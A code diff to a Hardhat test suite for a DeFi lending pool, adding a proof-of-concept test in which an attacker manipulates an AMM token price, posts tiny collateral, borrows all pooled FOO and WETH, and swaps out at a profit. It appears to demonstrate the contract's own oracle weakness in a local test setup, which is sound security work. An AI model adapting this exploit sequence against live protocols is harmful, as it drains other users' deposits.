@@ -1,6 +1,6 @@
 const { expect } = require("chai");
 const { ethers } = require("hardhat");
-const { toWei, delay } = require("./Utils");
+const { toWei, fromWei, delay } = require("./Utils");
 
 describe("AssetPool", () => {
   let deployer, user1, user2, pairFactory, ammRouter, fooToken, barToken, wethToken,
@@ -71,7 +71,6 @@ describe("AssetPool", () => {
 
     // Wrap 1000 ETH for User1 and User2
     await wethToken.connect(user1).deposit({ value: toWei(1000) });
-    await wethToken.connect(user2).deposit({ value: toWei(1000) });
   });
 
   getAssetPoolShareContract = async (tokenAddress) => {
@@ -182,5 +181,60 @@ describe("AssetPool", () => {
 
     // Verify repay interest is greater than 0
     expect(withdrawInterest).to.greaterThan(0);
+  });
+
+  it("Attacker can exploit the crypto to gain profit", async () => {
+    // Deployer deposit 1000 FOO
+    let depositAmount = toWei(1000);
+    await fooToken.approve(assetPool.address, depositAmount);
+    await assetPool.deposit(fooToken.address, depositAmount);
+
+    // User1 deposit 100 WETH
+    depositAmount = toWei(100);
+    await wethToken.connect(user1).approve(assetPool.address, depositAmount);
+    await assetPool.connect(user1).deposit(wethToken.address, depositAmount);
+
+    // Attacker (User2) get the balance of ETH before attack
+    const ethBalanceBeforeAttack = await ethers.provider.getBalance(user2.address);
+
+    // Attacker swaps 19 ETH for BAR token
+    await ammRouter.connect(user2).swapExactETHForTokens(0,
+      [wethToken.address, barToken.address], user2.address,
+      parseInt(new Date().getTime() / 1000) + 10000, { value: toWei(99) });
+
+    let barBalance = await barToken.balanceOf(user2.address);
+
+    // Attacker deposits 0.26 BAR to crypto loan asset pool
+    depositAmount = toWei(0.26);
+    await barToken.connect(user2).approve(assetPool.address, depositAmount);
+    await assetPool.connect(user2).deposit(barToken.address, depositAmount);
+
+    // Attacker borrows 1000 FOO
+    await assetPool.connect(user2).borrow(fooToken.address, toWei(1000));
+
+    // Attacker borrows 100 ETH
+    await assetPool.connect(user2).borrow(wethToken.address, toWei(100));
+    let wethBalance = await wethToken.balanceOf(user2.address);
+    await wethToken.connect(user2).withdraw(wethBalance);
+
+    // Attacker swaps 1000 FOO for ETH
+    await fooToken.connect(user2).approve(ammRouter.address, toWei(1000));
+    await ammRouter.connect(user2).swapExactTokensForETH(toWei(1000), 0,
+      [fooToken.address, wethToken.address], user2.address,
+      parseInt(new Date().getTime() / 1000) + 10000);
+
+    // Attacker swaps remaining BAR for ETH
+    barBalance = await barToken.balanceOf(user2.address);
+    await barToken.connect(user2).approve(ammRouter.address, barBalance);
+    await ammRouter.connect(user2).swapExactTokensForETH(barBalance, 0,
+      [barToken.address, wethToken.address], user2.address,
+      parseInt(new Date().getTime() / 1000) + 10000);
+
+    // Get the ETH balance of attacker, expect to make profit
+    const ethBalanceAfterAttack = await ethers.provider.getBalance(user2.address);
+    expect(ethBalanceAfterAttack).to.greaterThan(ethBalanceBeforeAttack);
+
+    console.log("Attacker's profit in ETH",
+      fromWei(ethBalanceAfterAttack.sub(ethBalanceBeforeAttack)))
   });
 });
